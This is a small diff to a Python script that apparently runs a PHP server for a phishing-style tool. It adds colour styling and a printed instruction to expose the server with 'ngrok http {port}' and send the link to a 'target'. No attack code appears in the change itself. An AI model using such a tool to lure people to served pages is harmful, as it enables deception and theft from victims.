@@ -2,7 +2,7 @@ import subprocess
 import time 
 import json
 import os
-from colorama import Fore
+from colorama import Fore,Back,Style
 
 def continue_proc(con_status='',con_path='',con_message=''):
 
@@ -170,5 +170,5 @@ def run_php_server(port,dir_name):
 
 
     print(Fore.RED+" [+] "+Fore.GREEN+"Link : "+Fore.WHITE+f"http://localhost:{port}")
-    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target\n")
+    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)
 
